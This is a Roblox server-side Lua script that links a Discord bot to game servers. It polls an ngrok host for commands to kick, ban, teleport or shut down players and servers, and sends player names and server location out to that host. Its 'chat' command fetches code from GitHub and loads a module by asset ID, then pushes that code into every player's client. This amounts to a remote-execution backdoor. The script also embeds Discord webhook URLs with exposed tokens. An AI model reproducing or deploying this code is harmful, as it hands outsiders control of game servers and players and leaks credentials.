--[[Discord to ROBLOX LUA Script
	Made by Vecko/Reloxz/1x3x3x7x1x7
	This script requires a hosted server, and a coded bot to connect and recieve input from
	Below holds the lua side to the magic bridge to have a discord-2-roblox(and)roblox-2-discord bridge/remote :-)
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local COMMAND_URL = "https://vecxoremoteapi.ngrok.pro/latest-command"
local REGISTER_URL = "https://vecxoremoteapi.ngrok.pro/register-server"
local REPORT_URL = "https://vecxoremoteapi.ngrok.pro/report-players"

local banned = {}
local exclusivewll = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973", "Palamode", "Korabi20", "1x3x3x7x1x7", "DeportedImported", "shelbomaster","dboyy725", "gamermeat1","VALENTINA964303_ALT", "idonthacklol101ns", "Dawninja21alt","SkeletonRaptor4903","hard_gamingfriends", "CoderCoenFurri", "Pendragon1977"}
local serverId = game.JobId
local serverLabel = "unknown"

task.spawn(function()
	local gameName = "Unknown Game"
	local placeId = game.PlaceId

	local success, gameInfo = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
	end)
	if success and gameInfo and gameInfo.Name then
		gameName = gameInfo.Name
	end

	while true do
		local success, res = pcall(function()
			return HttpService:PostAsync(
				REGISTER_URL,
				HttpService:JSONEncode({ 
					serverId = serverId,
					gameName = gameName,
					placeId = placeId
				}),
				Enum.HttpContentType.ApplicationJson
			)
		end)
		if success then
			local data = HttpService:JSONDecode(res)
			if data and data.label then
				serverLabel = data.label
			end
		end
		task.wait(30)
	end
end)

local function matchesPlayer(p, target)
	local targetLower = target:lower()
	return p.Name:lower():sub(1, #targetLower) == targetLower or p.DisplayName:lower():sub(1, #targetLower) == targetLower
end

local function runCommand(cmd)
	if not cmd or not cmd.text then return end

	local sender = cmd.sender or "Err"
	local text = cmd.text:lower()

	if text:sub(1, 2) == "m " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "FullScreenAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")

				local bg = Instance.new("Frame")
				bg.Size = UDim2.new(1, 0, 1, 0)
				bg.Position = UDim2.new(0, 0, 0, 0)
				bg.BackgroundColor3 = Color3.new(0, 0, 0)
				bg.BackgroundTransparency = 1 
				bg.Parent = gui

				local container = Instance.new("Frame")
				container.Size = UDim2.new(1, -100, 0, 180)
				container.Position = UDim2.new(0.5, 0, 0.5, 0)
				container.AnchorPoint = Vector2.new(0.5, 0.5)
				container.BackgroundTransparency = 1
				container.Parent = bg

				local titleLabel = Instance.new("TextLabel")
				titleLabel.Size = UDim2.new(1, 0, 0, 40)
				titleLabel.Position = UDim2.new(0, 0, 0, 0)
				titleLabel.BackgroundTransparency = 1
				titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				titleLabel.TextStrokeTransparency = 0.4
				titleLabel.Font = Enum.Font.Code
				titleLabel.TextScaled = true
				titleLabel.Text = "[Vecxo Remote API]:"
				titleLabel.Parent = container

				local senderLabel = Instance.new("TextLabel")
				senderLabel.Size = UDim2.new(1, 0, 0, 40)
				senderLabel.Position = UDim2.new(0, 0, 0, 40)
				senderLabel.BackgroundTransparency = 1
				senderLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
				senderLabel.TextStrokeTransparency = 0.6
				senderLabel.Font = Enum.Font.Code
				senderLabel.TextScaled = true
				senderLabel.Text = sender
				senderLabel.Parent = container

				local messageLabel = Instance.new("TextLabel")
				messageLabel.Size = UDim2.new(1, 0, 0, 90)
				messageLabel.Position = UDim2.new(0, 0, 0, 80)
				messageLabel.BackgroundTransparency = 1
				messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				messageLabel.TextStrokeTransparency = 0.4
				messageLabel.Text = ""
				messageLabel.Font = Enum.Font.Code
				messageLabel.TextScaled = true
				messageLabel.TextWrapped = true
				messageLabel.Parent = container

				local tweenService = game:GetService("TweenService")


				local fadeIn = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 0.4 })
				fadeIn:Play()
				fadeIn.Completed:Wait()

				local fullText = msg
				for i = 1, #fullText do
					messageLabel.Text = string.sub(fullText, 1, i)
					task.wait(0.025)
				end

				task.delay(5, function()
					local fadeOutBg = tweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 1 })
					local fadeOutMessage = tweenService:Create(messageLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutTitle = tweenService:Create(titleLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					local fadeOutSender = tweenService:Create(senderLabel, TweenInfo.new(0.5), { TextTransparency = 1, TextStrokeTransparency = 1 })
					fadeOutBg:Play()
					fadeOutMessage:Play()
					fadeOutTitle:Play()
					fadeOutSender:Play()
					fadeOutBg.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end
	if text:sub(1, 8) == "banlist" then
		local banCount = #banned
		local title = "🚫 Ban List - " .. (serverLabel or "Server")
		local description = ""

		if banCount == 0 then
			description = "No players are currently banned."
		else
			description = "**Total Banned Players:** " .. banCount .. "\n\n"
			for i, playerName in pairs(banned) do
				description = description .. "• " .. playerName .. "\n"
			end
		end

		local embed = {
			title = title,
			description = description,
			color = 0xFF0000,
			footer = { text = "Vecxo Remote API Bot" },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}

		local payload = {
			username = "Vecxo Remote API Bot",
			avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
			embeds = { embed }
		}
		local WEBHOOK_URL = "https://discord.com/api/webhooks/1407455106219249766/s6M5sqxmPfR4LmAi5MRNmm8__LCxS0FIbNnWjJuCbQyMlZJ6Oe2CT1fX7fFzWm0iGk6k"
		local success, err = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send banlist to Discord:", err)
		end
	end

	if text:sub(1,6) == "whois " then
		local target = text:sub(7):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if p.Name:lower():sub(1, #target) == target then
				local HttpService = game:GetService("HttpService")
				local userId = p.UserId
				local displayName = p.DisplayName
				local accountAge = p.AccountAge
				local isPremium = (p.MembershipType == Enum.MembershipType.Premium)
				local joinTime = os.date("%c", os.time()) -- readable time
				local serverId = (game.JobId ~= "" and game.JobId) or "Public Server"

				local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)

				local embed = {
					title = "Whois Lookup",
					description = "**Player:** " .. p.Name .. " (@" .. displayName .. ")\n" ..
						"**UserId:** " .. userId .. "\n" ..
						"**Account Age:** " .. accountAge .. " days\n" ..
						"**Premium:** " .. tostring(isPremium) .. "\n" ..
						"**Server ID:** " .. serverId,
					color = 0x007BFF,
					thumbnail = {
						url = avatarUrl
					},
					fields = {
						{
							name = "Queried At",
							value = joinTime,
							inline = false
						}
					},
					footer = {
						text = "Vecxo Remote API"
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}

				local payload = {
					username = "Vecxo Remote API Bot",
					avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
					embeds = {embed}
				}

				local WEBHOOK_URL = "https://discord.com/api/webhooks/1407455106219249766/s6M5sqxmPfR4LmAi5MRNmm8__LCxS0FIbNnWjJuCbQyMlZJ6Oe2CT1fX7fFzWm0iGk6k"

				local success, response = pcall(function()
					HttpService:PostAsync(
						WEBHOOK_URL,
						HttpService:JSONEncode(payload),
						Enum.HttpContentType.ApplicationJson
					)
				end)

				if not success then
					warn("Failed to send whois to Discord:", response)
				end

				break
			end
		end
	end

	local TextChatService = game:GetService("TextChatService")
	local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
	local gc = false

--[[	if game.PlaceId == 14747334292 then
		gc = true
	end]]

	local varName
	local varName2
	local gamegoog

	if gc then
		varName2 = "🏠 KAH Module"
		varName = "goog"
		gamegoog = 112691275102014
	else
		varName2 = "🌍 Universal Module"
		varName = "Epic"
		gamegoog = 88532011070135
	end

	if text:sub(1, 5) == "chat " then
		local msg = text:sub(6)
		local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
		end)

		if not success then
			warn'http failed with chat api'
			return
		end

		local formattedMessage = sender .. ": " .. msg
		code = code:gsub('%[Vecko%]: asd', formattedMessage)

		for i, plr in pairs(game.Players:GetPlayers()) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end
			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
	end

	if text:sub(1, 2) == "h " then
		local msg = cmd.text:sub(3)
		for _, player in pairs(Players:GetPlayers()) do
			task.spawn(function()
				local gui = Instance.new("ScreenGui")
				gui.Name = "RemoteAnnouncement"
				gui.ResetOnSpawn = false
				gui.IgnoreGuiInset = true
				gui.Parent = player:FindFirstChildOfClass("PlayerGui")
				local label = Instance.new("TextLabel")
				label.Size = UDim2.new(1, 0, 0, 40)
				label.Position = UDim2.new(0, 0, -0.1, 0)
				label.BackgroundTransparency = 0.3
				label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
				label.TextStrokeTransparency = 0.5
				label.Font = Enum.Font.Ubuntu
				label.TextScaled = true
				label.Text = ""
				label.Parent = gui
				local tweenService = game:GetService("TweenService")
				local tweenIn = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, 0, 0, 0)
				})
				tweenIn:Play()
				tweenIn.Completed:Wait()
				local fullText = "[Vecxo Remote API] - " .. sender .. ": " .. msg
				for i = 1, #fullText do
					label.Text = string.sub(fullText, 1, i)
					task.wait(0.04)
				end
				task.delay(5, function()
					local tweenOut = tweenService:Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
						Position = UDim2.new(0, 0, -0.1, 0)
					})
					tweenOut:Play()
					tweenOut.Completed:Wait()
					gui:Destroy()
				end)
			end)
		end
	end

	if text:sub(1, 5) == "kick " then
		local target = text:sub(6):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if matchesPlayer(p, target) then
				p:Kick("[Vecxo Remote API] Kicked by "..sender)
				break
			end
		end
	end

	if text:sub(1, 4) == "ban " then
		local target = text:sub(5):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if matchesPlayer(p, target) then
				table.insert(banned, p.Name)
				p:Kick("[Vecxo Remote API] Banned by "..sender)
				break
			end
		end
	end
	
	if text:sub(1, 6) == "unban " then
		local target = text:sub(7):lower()
		local unbannedPlayer = nil
		local found = false
		for i = #banned, 1, -1 do
			if banned[i]:lower():sub(1, #target) == target then
				unbannedPlayer = banned[i]
				table.remove(banned, i)
				found = true
				break
			end
		end
		local response = ""
		if found then
			response = "[" .. (serverLabel or "Server") .. "] Successfully unbanned: " .. unbannedPlayer
		else
			response = "[" .. (serverLabel or "Server") .. "] Player not found in ban list: " .. target
		end
		local title = "✅ Unbanned - " .. (serverLabel or "Server")
		local description = ""

		local embed = {
			title = title,
			description = description,
			color = 0xFF0000,
			footer = { text = "Vecxo Remote API Bot" },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}

		local payload = {
			username = "Vecxo Remote API Bot",
			avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
			embeds = { embed }
		}
		local WEBHOOK_URL = "https://discord.com/api/webhooks/1407455106219249766/s6M5sqxmPfR4LmAi5MRNmm8__LCxS0FIbNnWjJuCbQyMlZJ6Oe2CT1fX7fFzWm0iGk6k"
		local success, err = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send unban feedback to Discord:", err)
		end
	end

	if text:sub(1, 3) == "rj " then
		local target = text:sub(4):lower()
		for _, p in pairs(Players:GetPlayers()) do
			if matchesPlayer(p, target) then
				if game.PrivateServerId ~= "" then
					game:GetService("TeleportService"):Teleport(game.PlaceId, p)
				else
					local options = Instance.new("TeleportOptions")
					options.ServerInstanceId = game.JobId
					game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {p}, options)
				end
			end
		end
	end

	if text:sub(1, 9) == "shutdown " then
		for _, p in pairs(Players:GetPlayers()) do
			p:Kick("[Vecxo Remote API] Shutdown by "..sender)
		end
		game:Shutdown()
	end
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	local playerGui = player:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoHintGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui


	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 300, 0, 80)
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Position = UDim2.new(1, -20, 1, -20)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BackgroundTransparency = 0.8
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.ClipsDescendants = true
	frame.AutomaticSize = Enum.AutomaticSize.Y


	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -20, 0, 30)
	titleLabel.Position = UDim2.new(0, 10, 0, 10)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, -20, 0, 40)
	messageLabel.Position = UDim2.new(0, 10, 0, 40)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextSize = 16
	messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
	messageLabel.TextWrapped = true
	messageLabel.TextXAlignment = Enum.TextXAlignment.Left
	messageLabel.TextYAlignment = Enum.TextYAlignment.Top
	messageLabel.Parent = frame

	frame.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	messageLabel.TextTransparency = 1

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInGoals = {
		BackgroundTransparency = 0.8,
	}
	local fadeInTitleGoals = {
		TextTransparency = 0,
	}
	local fadeInMessageGoals = {
		TextTransparency = 0,
	}

	local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
	local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
	local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)

	fadeInTween:Play()
	fadeInTitleTween:Play()
	fadeInMessageTween:Play()

	fadeInTween.Completed:Wait()

	task.wait(4)

	local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
	local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
	local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

	fadeOutTween:Play()
	fadeOutTitleTween:Play()
	fadeOutMessageTween:Play()
	fadeOutTween.Completed:Wait()
	screenGui:Destroy()
end



Players.PlayerAdded:Connect(function(player)
	if table.find(banned, player.Name) then
		player:Kick("[Vecxo Remote API] You were remotely banned from the server.")
	end
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local DEBOUNCE_DELAY = 45
local debounceThread = nil

local function sendRequestNow()
	local playerNames = {}
	task.wait(0.5)
	for _, player in ipairs(Players:GetPlayers()) do
		table.insert(playerNames, player.Name)
	end

	local success, err = pcall(function()
		HttpService:PostAsync(
			REPORT_URL,
			HttpService:JSONEncode({
				serverId = serverId,
				players = playerNames
			}),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[Vecxo Remote API] Failed to auto-report players:", err)
		task.wait(10)
	end
end

local function debounceReport()
	if debounceThread then
		task.cancel(debounceThread)
	end
	debounceThread = task.delay(DEBOUNCE_DELAY, sendRequestNow)
end

task.spawn(sendRequestNow)

Players.PlayerAdded:Connect(debounceReport)
Players.PlayerRemoving:Connect(debounceReport)

local HttpService = game:GetService("HttpService")

local FAST_POLL = 3
local SLOW_POLL = 40
local IDLE_THRESHOLD = 65

local interval = FAST_POLL
local lastActiveTime = 0
local lastCommandHash = nil

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1406140626097143909/5TmMHblgWBJEQYNEQVjkOSA1f2P9Q8vHKTaH88zcql_srpuXEjTwiQkV906ekVG657WR"

local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function sendPollingStatusEmbed(isSlow, idleTime, interval)
	local color = isSlow and 0xFFFF00 or 0x00FF00
	local title = isSlow and "⚠️ Inactivity Detected" or "✅ Fast Polling Active"
	local description

	if isSlow then
		description =
			"No activity detected for **" .. idleTime .. "s**.\n" ..
			"Switched to a **slower polling mode**.\n\n" ..
			"⏱️ Next check in **" .. interval .. " second(s) for new commands executed**.\n" ..
			"⚠️ Idle threshold: **" .. IDLE_THRESHOLD .. " second(s)**."
	else
		description =
			"Fast polling is **active**.\n" ..
			"⚡ Commands will be executed quickly as long as there is Remote activity.\n\n" ..
			"⏱️ Checking every **" .. interval .. " second(s) for new commands executed**.\n" ..
			"⚠️ Idle threshold: **" .. IDLE_THRESHOLD .. " second(s)**."
	end

	local footerText
	if isSlow then
		footerText =
			"💡 Tip: Say !servers to check connected servers.\n" ..
			"Sending a command will switch back to fast polling after the current interval."
	else
		footerText = "🔍 Monitoring activity (idle threshold " .. IDLE_THRESHOLD .. "s)."
	end

	local embed = {
		title = title,
		description = description,
		color = color,
		footer = {
			text = footerText
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}

	local payload = {
		username = "Vecxo Remote API Bot",
		avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
		embeds = { embed }
	}

	local success, response = pcall(function()
		return HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode(payload),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[Discord Webhook Error]:", response)
	end
end


task.spawn(function()
	while true do
		task.wait(interval)
		local success, response = pcall(function()
			local url = COMMAND_URL .. "?serverId=" .. HttpService:UrlEncode(serverId)
			return HttpService:GetAsync(url)
		end)
		if success then
			local data = HttpService:JSONDecode(response)
			if data and data.command then
				local commandHash = HttpService:GenerateGUID(false)
				if commandHash ~= lastCommandHash then
					runCommand(data.command)
					lastCommandHash = commandHash
					lastActiveTime = tick()
					if interval ~= FAST_POLL then
						interval = FAST_POLL
						sendPollingStatusEmbed(false, 0, interval)
						for _, v in pairs(Players:GetPlayers()) do
							if table.find(exclusivewll, v.Name) then
								notifyv2(v, "[Vecxo Lite]: ", "✅ Remote Activity detected, switched to a faster poll")
							end
						end
					end
				end
			end
		else
			for _, v in pairs(Players:GetPlayers()) do
				if table.find(exclusivewll, v.Name) then
					notifyv2(v, "[Vecxo Lite]: ", "⚠️ Inactivity detected, Command fetch failed: " .. tostring(response))
				end
			end

			if interval ~= SLOW_POLL then
				interval = SLOW_POLL
				sendPollingStatusEmbed(true, IDLE_THRESHOLD, interval)
			end
		end

		if (tick() - lastActiveTime) > IDLE_THRESHOLD then
			if interval ~= SLOW_POLL then
				interval = SLOW_POLL
				sendPollingStatusEmbed(true, IDLE_THRESHOLD, interval)
				for _, v in pairs(game.Players:GetPlayers()) do
					if table.find(exclusivewll, v.Name) then
						notifyv2(v, "[Vecxo Lite]: ", "⚠️ Remote Inactivity detected, switched to a slower poll")
					end
				end
			end
		end
	end
end)


local function getServerLocation(timeout)
	local HttpService = game:GetService("HttpService")
	local serverCountry, serverRegion = "Unknown", "Unknown"
	timeout = timeout or 10
	local startTime = tick()
	local success, data = pcall(function()
		local response = HttpService:GetAsync("http://ip-api.com/json/")
		return HttpService:JSONDecode(response)
	end)
	if (tick() - startTime) > timeout then
		return serverRegion, serverCountry
	end
	if success and data then
		serverCountry = data.country or "Unknown"
		serverRegion = data.regionName or "Unknown"
	end
	return serverRegion, serverCountry
end

local function sendServerStatusEmbed(status, serverId, playerCount)
	local region, country = getServerLocation()
	local isConnect = (status == "connect")
	local color = isConnect and 0x00FF00 or 0xFF0000
	local title = isConnect and "✅ Server Connected" or "🛑 Server Closed"

	local gameInfo
	local gameName = "Unknown Game"
	local successInfo, result = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
	end)
	if successInfo and result and result.Name then
		gameName = result.Name
	end

	local description = string.format(
		"%s\n\n🎮 Game: **%s**\n👥 Player Count: **%d**\n🆔 Server ID: '%s'\n📍 Server Location: **%s, %s**",
		isConnect and "A new server has successfully connected." or "The server has been closed.",
		gameName, playerCount, serverId, region, country
	)

	local embed = {
		title = title,
		description = description,
		color = color,
		footer = { text = "Vecxo Remote API Bot" },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}

	local payload = {
		username = "Vecxo Remote API Bot",
		avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
		embeds = { embed }
	}
	local success, response = pcall(function()
		return game:GetService("HttpService"):PostAsync(
			WEBHOOK_URL,
			game:GetService("HttpService"):JSONEncode(payload),
			Enum.HttpContentType.ApplicationJson
		)
	end)

	if not success then
		warn("[Discord Webhook Error]:", response)
	end
end

sendServerStatusEmbed("connect", game.JobId, #Players:GetPlayers())

game:BindToClose(function()
	sendServerStatusEmbed("close", game.JobId, 0)
end)

for i, v in pairs(Players:GetPlayers()) do
	if table.find(exclusivewll, v.Name) then
		task.wait(5)
		notifyv2(v, "[Vecxo Lite]:", "✅ Remote API Successfully connected")
	end
end

Players.PlayerAdded:connect(function(plr)
	if table.find(exclusivewll, plr.Name) then
		task.wait(5)
		notifyv2(plr, "[Vecxo Lite]: ", "✅ Remote API Successfully connected")
	end
end)
